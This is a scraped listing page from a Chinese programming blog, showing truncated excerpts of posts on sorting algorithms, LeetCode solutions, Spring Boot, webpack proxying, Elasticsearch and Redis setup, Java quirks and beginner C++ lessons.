样例输出
解
归并排序
归并排序的思想
归并排序的实现
选择排序
选择排序的思想
选择排序的实现
插入排序
插入排序的思想
插入排序的实现
冒泡排序 冒泡排序的思想 每次将最大的一次一次的运到最右边，然后将最右边这个确定下来。再确定第二大的、第三大的...
对于数组a[],具体来说，每次确定操作就是从左往右扫描，如果a[i]&gt;a[i+1]，我们就执行swap(a[i],a[i+1])将两项交换，然后再往右检查，这样可以找出最大的并将其丢到最右边。
第一次确定操作是将a[1]~a[n]中最大的放到a[n]；
第二次确定操作是将a[1]~a[n-1]中最大的放到a[n-1]；
以此类推，时间复杂对为O(n^2)
由于排序过程中，数字向冒泡泡一样从左往右换过去，故名为冒泡排序
冒泡排序的实现 #include&lt;iostream&gt; using namespace std; const int N = 1e3 + 9; int a[N]; int main() { int n; cin &gt;&gt; n; for (int i = 1; i &lt;= n; ++i)cin &gt;&gt; a[i]; //i表示当前要确定的位置 for (int i = n; i &gt;= 1; --i) { //j从左往右扫 for (int j = 1; j &lt;= i - 1; ++j) { if (a[j] &gt; a[j + 1])swap(a[j], a[j + 1]); } } return 0; } 例题 蓝桥OJ3225 宝藏排序1 问题描述 注意：这道题于宝藏排序Ⅰ的区别仅是数据范围
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2714a41dacaf7c78bdc222bfa46d0c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40d8e38f35c082637c0b9e69afc7925b/" rel="bookmark">
			二叉树相关问题解决思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在做与二叉树相关的算法时，首先要看是否对中间节点进行操作。如果有，那么就看操作中间节点的顺序，按照顺序通过使用前中后遍历加上其他办法来解决该算法。如果没有，那么就是看目标值相对于每个中间节点的位置，通过比较向下寻找即可，不需要使用遍历。
2.在使用递归解决二叉树问题时，return后面的值就代表上一级对该return级操作的节点，比如：方法名为xunhuan(root)，当递归为xunhuan(root.left)，在root.left层级的return值就是root的做左节点。
3.在二叉从上向下寻找时，注意每个if之后要有return，使根节点始终与子节点相连，即使后面的子节点发生变化，也能与根节点连接上。
4.做二叉树相关算法时， 不要轻易操作原来二叉树中的节点。对某个节点操作时，一定要注意是否还需要操作该节点，如果还需要使用，就创建一个变量接收该节点，然后操作变量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8dcdb3266a8e274f39c55e93bf6b60a/" rel="bookmark">
			LeetCode-题目整理【3】：买卖股票的最佳时机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		买卖股票的最佳时机 都是求最大利润，但是在没有限制，如121和122，动态规划稍微复杂一些，建议不用，到最后两道难题，题目有限制，使用动态规划通过求解子问题的最优解来逐步求解原问题的最优解。
买卖股票的最佳时机 给定一个数组 prices ，它的第 i 个元素 prices[i] 表示一支给定股票第 i 天的价格。 你只能选择 某一天 买入这只股票，并选择在 未来的某一个不同的日子 卖出该股票。设计一个算法来计算你所能获取的最大利润。
返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 。
示例 1：
输入：[7,1,5,3,6,4]
输出：5
解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。
注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。
示例 2：
输入：prices = [7,6,4,3,1]
输出：0
解释：在这种情况下, 没有交易完成, 所以最大利润为 0。 func maxProfit(prices []int) int { minPrice := prices[0] maxProfit := 0 for i := 1; i &lt; len(prices); i++ { if prices[i] &lt; minPrice { minPrice = prices[i] } else if prices[i] - minPrice &gt; maxProfit { maxProfit = prices[i] - minPrice } } return maxProfit } //动态规划解答 func maxProfit(prices []int) int { if len(prices) == 0 { return 0 } n := len(prices) dp := make([]int, n) dp[0] = 0 minPrice := prices[0] for i := 1; i &lt; n; i++ { minPrice = min(minPrice, prices[i]) dp[i] = max(dp[i-1], prices[i]-minPrice) } return dp[n-1] } func min(a, b int) int { if a &lt; b { return a } return b } func max(a, b int) int { if a &gt; b { return a } return b } // 使用动态规划来解决这个问题，可以通过定义状态和状态转移方程来求解最大利润。 // 具体步骤如下： // 定义状态：使用一个一维数组 dp 来表示在第 i 天的最大利润，dp[i] 表示第 i 天卖出股票所能获取的最大利润。 // 初始化状态：dp[0] 初始化为 0。 // 状态转移方程：对于第 i 天，可以选择卖出股票或者不卖出股票。如果选择卖出股票，则最大利润为 prices[i] - minPrice，其中 minPrice 表示前 i 天的最低价格。如果选择不卖出股票，则最大利润为前一天的最大利润 dp[i-1]。因此，状态转移方程为 dp[i] = max(dp[i-1], prices[i] - minPrice)。 // 更新最低价格：在更新状态之前，需要将当前价格 prices[i] 和之前的最低价格 minPrice 进行比较，更新最低价格为较小的那个。 // 遍历结束后，返回 dp[n-1]，其中 n 表示数组 prices 的长度。 买卖股票的最佳时机 II
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8dcdb3266a8e274f39c55e93bf6b60a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bbea9d3057bb842cec4c19ad556e0d8/" rel="bookmark">
			基于springboot的二手物品交易的设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		收藏关注不迷路，源码文章末
文章目录 一、项目介绍二、开发环境三、功能介绍四、核心代码五、效果图六、文章目录 一、项目介绍 二手物品交易管理系统按照操作主体分为管理员和用户。管理员的功能包括收货地址管理、购物车管理、字典管理、公告管理、商家管理、商品管理、用户咨询管理、商品收藏管理、商品评价管理、商品订单管理、用户管理、管理员管理。用户的功能等。该系统采用了Mysql数据库，Java语言，Spring Boot框架等技术进行编程实现。
二手物品交易管理系统可以提高二手物品交易信息管理问题的解决效率，优化二手物品交易信息处理流程，保证二手物品交易信息数据的安全，它是一个非常可靠，非常安全的应用程序。
关键词：二手物品交易管理系统；Mysql数据库；Java语言
二、开发环境 开发语言：Java
框架：springboot
JDK版本：JDK1.8
服务器：tomcat7
数据库：mysql
数据库工具：Navicat11
开发软件：eclipse/myeclipse/idea
Maven包：Maven
————————————————
三、功能介绍 二手物品交易管理系统根据使用权限的角度进行功能分析，并运用用例图来展示各个权限需要操作的功能。
图4.1即为设计的管理员功能结构，管理员权限操作的功能包括管理公告，管理二手物品交易信息，包括商家管理，用户咨询管理，商品管理，公告管理等，可以管理用户咨询。
图4.1 管理员功能结构
四、核心代码 部分代码：
package com.example.controller; import cn.hutool.core.util.StrUtil; import cn.hutool.crypto.SecureUtil; import com.example.common.Result; import com.example.common.ResultCode; import com.example.entity.Caiwu; import com.example.exception.CustomException; import com.example.service.CaiwuService; import com.example.utils.MapWrapperUtils; import com.example.utils.jwt.JwtUtil; import com.example.vo.CaiwuVo; import org.springframework.beans.BeanUtils; import org.springframework.web.bind.annotation.*; import javax.annotation.Resource; import javax.servlet.http.HttpServletRequest; import java.util.HashMap; import java.util.List; import java.util.Map; @RestController @RequestMapping(value = "/caiwu") public class CaiwuController { @Resource private CaiwuService caiwuService; @PostMapping public Result&lt;Caiwu&gt; add(@RequestBody CaiwuVo caiwu) { caiwuService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bbea9d3057bb842cec4c19ad556e0d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4ada0182bd392e366f3154fcc05feb7/" rel="bookmark">
			webpack-dev-server原理解析及其中跨域解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		webpack proxy ,就是 webpack 提供的解决跨域的方案。其基本行为是接受客户端发送的请求后转发给其他的服务器，目的是为了解决在开发模式下的跨域问题。
原理 webpack中的proxy 工作原理是利用了 http-proxy-middleware 这个http 代理中间件，实现将请求转发给其他的服务器。
如下：在开发阶段，本地地址是 Http://loaclhost:3000 , 该浏览器发送一个前缀带有 /api 标识的向服务器请求数据，但是这个服务器只是将这个请求转发给另一台服务器：
const express = require('express'); const proxy = require('http-proxy-middleware'); const app = express(); app.use('/api', proxy({target: 'http://www.test.org', changeOrigin: true})); app.listen(3000); // http://localhost:3000/api/foo/bar -&gt; http://www.test.org/api/foo/bar 在开发阶段，webpack-dev-server 会自动启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上的，而后端服务器又是运行在另一个地址上.。
所以在开发阶段中，由于浏览器的同源策略，当本地浏览器访问后端服务器的时候就会出现跨域请求资源的问题。
通过设置 webpack proxy 实现代理请求后，相当于浏览器和服务器之间添加了一个代理服务器。
当本地发送请求的时候，中间服务器会接受这个情求，并将这个请求转发给目标服务器（也就是后端服务器），目标服务器返回数据后，中间服务器又会将数据返回给浏览器，当中间服务器将数据返回给服务器的时候，它们两者是同源的，并不会存在跨域的问题。
服务器和服务器之间是不会存在跨域资源的问题的。
webpack-dev-server webpack 提供代理服务器的工具是webpack-dev-server，但只适用于开发阶段，线上要实现代理一般通过 nginx 来配置。
webpack 中的服务器工具 webpack-dev-server，实质上是启动了一个 express 服务器。
proxy 代理是利用 http-proxy-middleware 这个http代理中间件实现将请求转发给其他服务器。
（vite 是用的 http-proxy，其实 http-proxy-middleware 也是基于 http-proxy 的）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4ada0182bd392e366f3154fcc05feb7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1873b9cf3823ef32e820b6fabacbaaf0/" rel="bookmark">
			某马头条——day07
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		APP端搜索 搭建ES环境 docker pull elasticsearch:7.4.0 docker run -id --name elasticsearch -d --restart=always -p 9200:9200 -p 9300:9300 -v /usr/share/elasticsearch/plugins:/usr/share/elasticsearch/plugins -e "discovery.type=single-node" elasticsearch:7.4.0 配置中文分词器 ik 因为在创建elasticsearch容器的时候，映射了目录，所以可以在宿主机上进行配置ik中文分词器
在去选择ik分词器的时候，需要与elasticsearch的版本好对应上
把资料中的elasticsearch-analysis-ik-7.4.0.zip上传到服务器上,放到对应目录（plugins）解压
#切换目录 cd /usr/share/elasticsearch/plugins #新建目录 mkdir analysis-ik cd analysis-ik #root根目录中拷贝文件 mv elasticsearch-analysis-ik-7.4.0.zip /usr/share/elasticsearch/plugins/analysis-ik #解压文件 cd /usr/share/elasticsearch/plugins/analysis-ik unzip elasticsearch-analysis-ik-7.4.0.zip 重启docker出了点问题docker.socket: Failed with result ‘service-start-limit-hit‘._docker.socket: failed with result 'service-start-l-CSDN博客
成功后进行测试 app端文章搜索 需求分析 http://192.168.200.130:9200/app_info_articleput请求 ：http://192.168.200.130:9200/app_info_article http://192.168.200.130:9200/app_info_article { "mappings":{ "properties":{ "id":{ "type":"long" }, "publishTime":{ "type":"date" }, "layout":{ "type":"integer" }, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1873b9cf3823ef32e820b6fabacbaaf0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d0401e3c04b8f4f32d3d5c8273a3ad5/" rel="bookmark">
			LeetCode-410.分割数组的最大值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原题链接：https://leetcode.cn/problems/split-array-largest-sum/description
题面
给定一个非负整数数组 nums 和一个整数 k ，你需要将这个数组分成 k 个非空的连续子数组。设计一个算法使得这 k 个子数组各自和的最大值最小。
思路
数组定义：f[i][j]: 前i个数字，分为j段各自和的最大值
状态方程定义：f[i][j] = Math.min(f[i][j], Math.max(f[k][j-1]+sub(i)-sub(k))) #sub为前缀和
初始化：k=0状态不存在，则f[0][0]=0，需要求最小值则将其余的设置为最大值即可
代码
// f[i][j] = 前i个数分割为j段所能得到的最大连续子数组和的最小值 public int splitArray(int[] nums, int m) { int n = nums.length; int[][] f = new int[n + 1][m + 1]; // init dp for (int i = 0; i &lt;= n; i++) { Arrays.fill(f[i], Integer.MAX_VALUE); } f[0][0] = 0; //prefix int[] sub = new int[n + 1]; for (int i = 1; i &lt;= n; i++) { sub[i] = sub[i - 1] + nums[i - 1]; } // dp for (int i = 1; i &lt;= n; i++) { for (int j = 1; j &lt;= Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d0401e3c04b8f4f32d3d5c8273a3ad5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1247da05bd655ae5925de4f4fbf46fa4/" rel="bookmark">
			牛客网-JAVA（错题集）-1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1
Java的抽象类和接口不可以进行实例化
2
知识点：
1、不论如何 finally里面的代码是一定会执行的
2、finally里面的代码块比return早执行
3、多个return是按顺序执行的，只执行一次
public abstract class Test { public static void main(String[] args) { System.out.println(beforeFinally()); //1 } public static int beforeFinally(){ int a = 0; try{ a = 1; return a; }finally{ a = 2; } } } 先执行a=2 然后a=1覆盖了a=2 此时a=1 try里面有return 所以现将a=1加入到临时栈中 然后先不return，先执行finally里面的a=2，由于finally里面没有return所以a=2不存入临时栈中 执行完毕后再return 返回的是临时栈中的a=1 public abstract class Test { public static void main(String[] args) { System.out.println(beforeFinally()); //2 } public static int beforeFinally(){ int a = 0; try{ a = 1; return a; }finally{ a = 2; return a; } } } 先a=1存入临时栈中，再执行finally a=2，finally里面也有一个return ，这时会把a=2更新到临时栈中 参考： 作者：贱贱的梦想 链接：https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1247da05bd655ae5925de4f4fbf46fa4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2249bcf2260911ece124b6c5e6bcce2/" rel="bookmark">
			Redis安装与配置教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.Windows 下安装Redis 的几种方式
1. 微软官方维护的 Redis（不推荐）
2.zkteco-home 维护的 Redis
3.yes8080维护的Redis
4. tporadowski 维护的 Redis
5.使用gcc编译器在Windows下编译redis源码（不推荐）
6. 使用 WSL 安装 Redis（推荐）
二.Redis的安装与配置
1.以方法2进行安装配置
（1）下载安装包
（2）解压安装包
（3）启动Redis服务
（4） 连接Redis服务
​编辑
（5）设置服务自启动 （6）测试Redis服务
（7）添加PATH环境变量
（8）停止或删除Redis服务
一.Windows 下安装Redis 的几种方式 Redis 官网地址：https://redis.io/
Redis 源码地址：https://github.com/redis/redis
Redis 在 Windows 平台上不受官方支持，Redis 官方只提供了源码包（zip、tar.gz 格式）。
以下是Windows安装Redis的几种方法。
1. 微软官方维护的 Redis（不推荐） 可以下载微软官方维护的支持 Windows平台的 Redis 安装包
下载地址：https://github.com/microsoftarchive/redis/releases
注意：仅有 Redis2.0 和 Redis3.0 的部分版本，最后一次更新是2016年，目前已停止维护了。而截止到目前Redis官网的最新版本是 Redis7.2
2.zkteco-home 维护的 Redis 地址：https://github.com/zkteco-home/redis-windows/releases
已编译好的适用于Windows的，较新版本的redis（目前最新版本7.0.11）
（Redis for Windows X64，使用Visual Studio 2022编译，据说比Cygwin, MSYS编译的更稳定、更高性能）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2249bcf2260911ece124b6c5e6bcce2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea93ccdef8c27b855ff3b85b0b4c6326/" rel="bookmark">
			从0开始学C&#43;&#43; 第十八课：继承
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第十八课：继承 学习目标：
了解继承在C++中的基本概念。学会如何在C++中创建基类和派生类。理解如何通过继承复用代码。掌握基类和派生类之间的关系。 学习内容：
继承的概念：
继承是面向对象编程的一个核心概念，它允许创建一个新的类（派生类或子类）基于现有类（基类或父类）。继承的主要目的是为了代码复用和创建一个有层次的类结构。
创建基类：
基类是其他类的基础，它定义了派生类都将继承的通用属性和行为。
代码示例：
// 基类Vehicle class Vehicle { protected: int wheels; int maxSpeed; public: Vehicle(int w, int s) : wheels(w), maxSpeed(s) void displayBaseInfo() { cout &lt;&lt; "Wheels: " &lt;&lt; wheels &lt;&lt; ", Max Speed: " &lt;&lt; maxSpeed &lt;&lt; endl; } }; 创建派生类：
派生类继承了基类的特征，并可以添加新的特征或覆盖（override）基类的方法。
代码示例：
// 派生类Car class Car : public Vehicle { private: string model; public: Car(int w, int s, string m) : Vehicle(w, s), model(m) void display() { displayBaseInfo(); // 调用基类方法 cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea93ccdef8c27b855ff3b85b0b4c6326/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057c6e918c2d8e6e947eeb2cf372ac5f/" rel="bookmark">
			Java中的代理模式（二）JDK动态代理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好👋，我是极客涛😎，上一篇中我们对代理模式有两大类，静态代理和动态代理，对于静态代理相信大家都信手拈来。对于动态代理还有两种实现，一种是java原生的Jdk代理，一种是Cglib方式。因为涉及到源码解读，所以我也将分两期完成，本期主要讲讲JDK动态代理的实现方式
示例 先举个小例子，创建接口
public interface Father { void eat(); } 创建实现类
public class Son implements Father{ @Override public void eat() { System.out.println("吃饭"); } } 测试
public class ProxyTest { public static void main(String[] args) { ProxyTest test = new ProxyTest(); test.jdkProxy(); } private void jdkProxy(){ Father son = new Son(); Father proxySon = (Father) Proxy.newProxyInstance(son.getClass().getClassLoader(), son.getClass().getInterfaces(), new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/057c6e918c2d8e6e947eeb2cf372ac5f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b4b7208b011f8bfd35ceb15ca3bae11/" rel="bookmark">
			SpringMvc中拦截器的配置及应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		拦截器原理 在 Spring MVC 中，拦截器（Interceptor）是一种机制，用于拦截请求并在处理程序（Controller）执行之前或之后执行一些操作。拦截器允许您在请求的不同阶段（如处理程序执行前、处理程序执行后、视图渲染前、视图渲染后等）添加自定义逻辑。
其中问号就是拦截器处理的范围。
实现自定义拦截器 @Component public class SampleInterceptor implements HandlerInterceptor { // 在controller执行前的逻辑 @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { // 在controller执行之前执行的逻辑 System.out.println("Pre-handle logic"); return true; // 返回 true，将允许请求继续传递到处理程序； //返回 false，将阻止请求传递给处理程序 } // 在controller执行后、并在视图渲染前执行的逻辑 @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { System.out.println("Post-handle logic"); } //在服务器响应结束后执行的逻辑 @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b4b7208b011f8bfd35ceb15ca3bae11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adf873367b199857e0433793c6e66b72/" rel="bookmark">
			leetcode-环形链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		141. 环形链表
题解：
这个问题可以使用快慢指针的方法来解决。首先，我们创建一个虚拟头节点，并将虚拟头节点的下一个节点指向head。然后我们创建两个指针，一个快指针和一个慢指针。快指针每次移动两个节点，而慢指针每次移动一个节点。如果链表中存在环，那么快指针和慢指针最终会在环内的某个位置相遇。如果链表中不存在环，那么快指针会先到达链表的尾部。
# Definition for singly-linked list. # class ListNode: # def __init__(self, x): # self.val = x # self.next = None class Solution: def hasCycle(self, head: Optional[ListNode]) -&gt; bool: if not head or not head.next: return False dummy_head = ListNode(0) dummy_head.next = head slow = dummy_head fast = dummy_head.next while slow != fast: if not fast or not fast.next: return False slow = slow.next fast = fast.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adf873367b199857e0433793c6e66b72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15b30c759bbe8ac426925aec3dd80158/" rel="bookmark">
			linux中报错Caused by: java.nio.file.NoSuchFileException: storage/03k3uv7k1lijsd5r1bo0.jpg
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 项目是springboot+vue 部署在linux系统中 上传图片的时候 报错
记录一下我的解决办法
这个错误 java.nio.file.NoSuchFileException 表示在指定路径下找不到文件。在你的例子中，报错的文件路径是 storage/03k3uv7k1lijsd5r1bo0.jpg。
首先，确保路径是相对于你的应用程序运行的工作目录的。相对路径通常是相对于你的应用程序的根目录或者配置的文件存储根目录。在这个问题中，看起来你使用的是相对路径 storage/03k3uv7k1lijsd5r1bo0.jpg。
接下来，你需要确保文件真的存在于这个路径下。你可以通过以下步骤来检查：
打开终端，进入你的应用程序所在的目录。使用 ls 命令查看是否存在 storage 目录。如果不存在，你需要创建它，并确保你的应用程序有写入该目录的权限。如果 storage 目录存在，继续使用 ls 命令查看是否存在 iv4inyvyb09x51c04kj0.jpg 文件。如果不存在，可能是文件没有被正确保存或者被删除了。 另外，请注意 Linux 文件系统是大小写敏感的，确保文件名的大小写与实际文件系统中的一致。
我是宝塔操作的 所以直接在 根目录中建了一个文件夹 就好了。为什么需要手动去建我也不清楚 求大神解答~ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88b0db419e1eef74ac3e82835ef43087/" rel="bookmark">
			Tomcat的maxParameterCount&amp;maxPostSize参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Tomcat的maxParameterCount&amp;maxPostSize参数 Tomcat的maxParameterCount&amp;maxPostSize参数1.问题1.1问题现象1.2 参数总结1.3 问题总结 2 Tomcat官网的解释2.1 到`https://tomcat.apache.org/`找到文档入口2.2 找到文档的`Reference`2.3 查看配置文件的参数 3 文档看不明白，自己做实验吧。3.1 `maxParameterCount` 参数个数3.2 `maxPostSize`POST请求参数大小 4.实验配置 Tomcat的maxParameterCount&amp;maxPostSize参数 参考文章：
嵌入式Tomcat容器的参数(maxParameterCount&amp;maxPostSize)设定，参数过多解决方案
1.问题 1.1问题现象 周五同事说，请求的参数拿不到了。但是同一个接口请求参数太大就没有参数了，参数少的话服务端是有参数的。
打开浏览器的控制台，发现POST的请求参数中的有一个参数很大，所有的参数加起来有2.8M了。网上查了一下Tomcat的配置，
原来配置文件中有一个masPostSize的参数。因此这个博客来看看tomcat的maxParameterCount&amp;maxPostSize参数，看看是不是这个问题导致的。
这里截图看到线上是Content-Type: application/x-www-form-urlencoded;charset=UTF-8的POST请求类型，Content-Length:有问题的是2.8M，并不是这个截图所示的234B。
1.2 参数总结 maxParameterCount控制请求参数的个数，对于application/x-www-form-urlencoded or multipart/form-data的POST请求来说是请求参数和请求体参数总个数。超出的参数获取不到maxPostSize控制POST请求参数大小的限制。 application/x-www-form-urlencoded大小超过的参数获取不到。 multipart/form-data 大小超过异常报错。 1.3 问题总结 tomcat的maxPostSize没有设置，默认的是2M，请求是application/x-www-form-urlencoded 类型的，所以也不会报错。参数字节数小的可以获取到，参数字节数大的就获取不到了。
2 Tomcat官网的解释 2.1 到https://tomcat.apache.org/找到文档入口 2.2 找到文档的Reference 2.3 查看配置文件的参数 maxParameterCount The maximum total number of request parameters (including uploaded files) obtained from the query string and, for POST requests, the request body if the content type is application/x-www-form-urlencoded or multipart/form-data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88b0db419e1eef74ac3e82835ef43087/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b83258c4db2a1b35e9c01d8d56a1d3ba/" rel="bookmark">
			从0开始学C&#43;&#43; 第十七课：运算符重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第十七课：运算符重载 学习目标：
理解运算符重载的概念和目的。学习如何在类中重载运算符。掌握重载不同运算符的基本规则。 学习内容：
运算符重载的概念：
运算符重载允许你为自定义数据类型重新定义操作符的行为，使得你可以对类的对象使用像 +、-、== 等标准运算符。 如何在类中重载运算符：
运算符可以通过成员函数或全局函数重载。一些运算符，如赋值(=)，必须通过成员函数重载。 重载加法运算符的示例：
代码示例：#include &lt;iostream&gt; using namespace std; class Point { private: int x, y; public: Point(int x1, int y1) : x(x1), y(y1) // 重载 '+' 运算符 Point operator+(const Point&amp; p) { Point point(x + p.x, y + p.y); return point; } void display() { cout &lt;&lt; "(" &lt;&lt; x &lt;&lt; ", " &lt;&lt; y &lt;&lt; ")" &lt;&lt; endl; } }; int main() { Point p1(1, 2); Point p2(3, 4); Point p3 = p1 + p2; // 使用重载的 '+' 运算符 p3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b83258c4db2a1b35e9c01d8d56a1d3ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e530aeaacddf22ed3314756fa7a9f15/" rel="bookmark">
			从0开始学C&#43;&#43; 第十六课：C&#43;&#43;中的初始化列表和构造函数初始化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第十六课：C++中的初始化列表和构造函数初始化
学习目标：
理解初始化列表在C++构造函数中的作用。学会使用初始化列表来初始化类的成员变量。掌握初始化列表与构造函数体的执行顺序。 学习内容：
初始化列表的概念：
初始化列表是构造函数后面跟随的一个冒号和初始化表达式的列表，用于直接初始化成员变量。它提供了一种比在构造函数体中赋值更高效的初始化方式。 基本语法：
语法格式：Constructor() : member1(value1), member2(value2) {...}列表中的成员变量必须按照它们在类中声明的顺序初始化。 初始化列表的优点：
允许成员变量在构造时直接初始化，避免了先默认初始化然后再赋值的额外开销。对于常量和引用类型的成员变量，必须在初始化列表中进行初始化。对于某些类型（如类类型），成员变量可能没有默认构造函数，使用初始化列表可以明确地调用特定的构造函数。 实例说明：
假设有一个Point类，它有两个私有成员x和y，可以使用初始化列表来初始化这些成员。 class Point { private: int x; int y; public: // 使用初始化列表 Point(int x, int y) : x(x), y(y) void print() { std::cout &lt;&lt; "Point(" &lt;&lt; x &lt;&lt; ", " &lt;&lt; y &lt;&lt; ")" &lt;&lt; std::endl; } }; 使用Point类并调用print方法： int main() { Point p(1, 2); p.print(); // 输出: Point(1, 2) return 0; } 预计输出效果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e530aeaacddf22ed3314756fa7a9f15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4a0cadb5584a36b5991ec4790c7e9bb/" rel="bookmark">
			从0开始学C&#43;&#43; 第四课：常用C&#43;&#43;编辑器和集成开发环境（IDE）的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第四课：常用C++编辑器和集成开发环境（IDE）的使用 在这一课中，我们将了解一些流行的C++编辑器和集成开发环境（IDE），它们可以简化C++的编写、编译和调试过程。我们将介绍三种流行的IDE：Visual Studio Code、Eclipse和CLion，并指导如何设置一个简单的C++项目。
目标 了解不同的C++ IDE和编辑器。学会在IDE中设置C++项目。编写、编译和运行一个简单的C++程序，不使用命令行。 Visual Studio Code（VS Code） VS Code是一个轻量级但功能强大的源代码编辑器。虽然它不是一个完整的IDE，但你可以通过安装扩展来支持C++开发。
下载并安装VS Code。打开VS Code。通过 Ctrl+P 快捷键，输入 ext install ms-vscode.cpptools 安装C++扩展。重启VS Code。创建一个新的C++文件（例如 hello.cpp）并编写你的代码。打开集成终端（Ctrl+``）并输入 g++ hello.cpp -o hello` 来编译你的程序。在终端运行编译后的程序 ./hello。 Eclipse Eclipse是一个开源的IDE，适用于多种编程语言，Eclipse CDT是其C/C++开发工具的版本。
下载并安装Eclipse CDT。启动Eclipse并选择一个工作空间。创建一个新的C++项目：File -&gt; New -&gt; C++ Project。在项目中创建一个新的C++源文件。编写你的代码。使用Eclipse的构建按钮编译你的程序。在Eclipse中运行你的程序。 CLion CLion是JetBrains开发的一个跨平台的C/C++ IDE，它提供了许多智能功能，如代码分析、自动重构等。
